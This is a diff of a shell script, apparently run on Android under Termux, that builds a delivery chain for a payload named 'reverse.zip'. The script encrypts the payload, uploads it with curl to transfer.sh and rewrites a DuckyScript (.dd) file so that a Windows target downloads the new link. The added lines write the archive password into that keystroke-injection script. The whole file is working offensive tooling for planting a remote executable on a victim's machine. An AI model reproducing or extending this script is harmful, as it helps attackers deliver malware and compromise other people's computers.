@@ -54,6 +54,8 @@ echo "\033[1;33m\n:::: CLEAR DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON T
 read UPLOAD_choice
 if [ $UPLOAD_choice = "yy" ]; then
 	zip -e $ENCRYPTEDFILE $TEMP/$FILE*
+	echo "\033[1;32m:::: If you want a DuckyScript (only for Windows) please retype your password to update the .dd file, if not type "n"\nHERE (then press enter) ::: \033[0m"
+	read password
 	curl --upload-file $ENCRYPTEDFILE https://transfer.sh/reverse.zip > $LINKFILE
 	echo "\033[1;32m:::: Uploading the file into transfer.sh ... \033[0m"
 	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \$ zip -d $FILE\033[0m"
@@ -70,10 +72,16 @@ if [ $UPLOAD_choice = "y" ]; then
 	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
 fi
 
-echo "::::The .dd file is creating .."
-rm /storage/emulated/0/utiles/payload.dd
-echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
-
+if [ $password = "" ]; then
+	continue
+else
+	echo "::::The .dd file is creating .."
+	rm /storage/emulated/0/utiles/payload.dd
+	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
+	echo "::::The links have been changed"
+	echo "$(cat /storage/emulated/0/utiles/payload.dd | perl -p -e "s/SECRET/$password/")" > /storage/emulated/0/utiles/payload.dd
+	echo "::::The archive password has been added to the .dd file"
+fi
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
 echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
 echo "new link:\033[1;32m $(cat /storage/emulated/0/utiles/payload.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
